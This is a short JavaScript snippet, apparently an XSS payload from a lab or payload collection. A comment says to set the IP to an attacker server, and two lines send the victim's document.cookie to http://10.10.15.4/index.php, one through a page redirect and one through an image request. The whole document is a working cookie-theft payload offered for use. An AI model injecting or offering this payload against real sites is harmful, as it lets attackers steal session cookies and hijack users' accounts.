// Modify ip to attacker server.
document.location='http://10.10.15.4/index.php?c='+document.cookie;
new Image().src='http://10.10.15.4/index.php?c='+document.cookie;